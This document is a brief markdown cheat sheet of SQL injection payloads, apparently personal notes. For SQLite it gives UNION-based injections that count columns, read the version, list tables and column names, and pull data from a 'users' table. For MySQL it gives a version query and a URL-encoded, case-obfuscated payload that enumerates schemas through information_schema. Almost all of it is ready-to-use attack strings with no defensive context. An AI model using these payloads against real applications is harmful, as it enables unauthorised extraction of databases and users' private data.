# sqli

## SQLITE

`' order by #` =&gt; to get the number of columns

`' union select (select sqlite_version()),NULL,NULL,NULL--` =&gt; to get the sqlite version

`' union select (select group_concat(name) from sqlite_master where type='table'),NULL,NULL,NULL--` =&gt; to get table names

`' union select (SELECT group_concat(name) FROM PRAGMA_TABLE_INFO('users')),NULL,NULL,NULL--` =&gt; to get column names in a table called users

`' union select (SELECT group_concat(notes) FROM 'users'),NULL,NULL,NULL--` =&gt; to get data from notes column in users table

## MySQL

we can extract most stuff here using information\_schema

for version =&gt; @@VERSION =&gt; union select \(@@VERSION\)

search=adm'+union+select+1,1,1,1,1,\(gRoUp\_cOncaT\(0x7c,schema\_name,0x7c\)\)+from+information\_schema.schemata+--+-

